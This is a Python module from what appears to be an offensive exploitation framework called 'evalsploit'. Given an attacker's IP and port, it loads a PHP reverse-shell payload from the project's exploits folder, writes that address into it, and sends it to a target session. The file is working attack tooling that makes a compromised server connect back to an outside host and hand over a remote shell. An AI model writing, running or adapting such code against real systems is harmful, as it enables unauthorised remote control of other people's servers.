"""reverse: reverse shell (monkey / ivan)."""

from __future__ import annotations

from pathlib import Path
from typing import TYPE_CHECKING, Optional

from evalsploit.config import project_root
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


@register("reverse")
class ReverseModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            print("Usage: reverse IP:PORT")
            return None
        parts = args.strip().split(":", 1)
        ip = parts[0].strip()
        try:
            port = int(parts[1].strip())
        except (IndexError, ValueError):
            print("Need IP:PORT")
            return None
        path = project_root() / "exploits" / "reverse" / "reverse2.php"
        if not path.exists():
            print("reverse2.php not found")
            return None
        data = path.read_text(encoding="utf-8", errors="replace")
        data = data.replace("$sh = new Sh(__IP__, __PORT__);", f"$sh = new Sh('{ip}', {port});")
        print("Starting reverse...")
        out = ctx.send(data)
        print(out)
        return None
